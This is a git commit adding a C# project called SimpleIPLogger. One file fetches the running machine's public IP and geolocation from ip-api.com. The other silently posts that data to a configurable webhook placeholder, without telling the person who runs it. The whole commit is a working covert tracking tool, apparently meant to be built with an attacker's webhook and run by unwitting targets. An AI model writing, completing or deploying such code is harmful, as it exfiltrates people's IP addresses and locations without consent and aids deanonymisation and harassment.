c2e8f524b5baface9e72fe3c509bc3dcf021621b
F4AG0 <83473881+FRAGOEXE@users.noreply.github.com>
2021-12-16 07:20:55 +0100

    Add files via upload

---
+++ SimpleIPLogger/SimpleIPLogger/IPLogger.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+
+namespace SimpleIPLogger
+{
+    class IPLogger
+    {
+        public static string GetIp()
+        {
+            string ip = new WebClient().DownloadString("http://ip-api.com/line/");
+            return ip;
+        }
+    }
+}
---
+++ SimpleIPLogger/SimpleIPLogger/Program.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Collections.Specialized;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace SimpleIPLogger
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string webhook = "__WEBHOOK__";
+            var wbc = new WebClient();
+            var Data = new NameValueCollection();
+            Data["content"] = IPLogger.GetIp();
+            wbc.UploadValues(webhook, Data);
+        }
+    }
+}
